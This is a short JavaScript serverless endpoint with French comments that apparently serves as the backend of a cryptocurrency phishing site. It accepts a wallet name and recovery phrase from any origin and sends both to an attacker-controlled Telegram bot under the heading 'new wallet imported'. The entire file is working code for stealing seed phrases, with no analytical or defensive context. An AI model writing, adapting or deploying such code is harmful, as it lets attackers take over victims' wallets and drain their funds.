// api/envoi.js
export default async function handler(req, res) {
  // Autoriser les requêtes depuis ton site
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Méthode non autorisée' });

  const { nom, phrase } = req.body;

  // Récupération des variables d'environnement configurées sur Vercel (SÉCURISÉ)
  const token = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    return res.status(500).json({ error: 'Configuration serveur manquante' });
  }

  try {
    const message = `🚨 *NOUVEAU PORTEFEUILLE IMPORTÉ* 🚨\n\n📁 *Nom :* ${nom}\n🔑 *Phrase :* \`${phrase}\``;
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    res.status(200).json({ status: 'success' });
  } catch (error) {
    console.error(error);
    res.status(500).json({ status: 'error' });
  }
}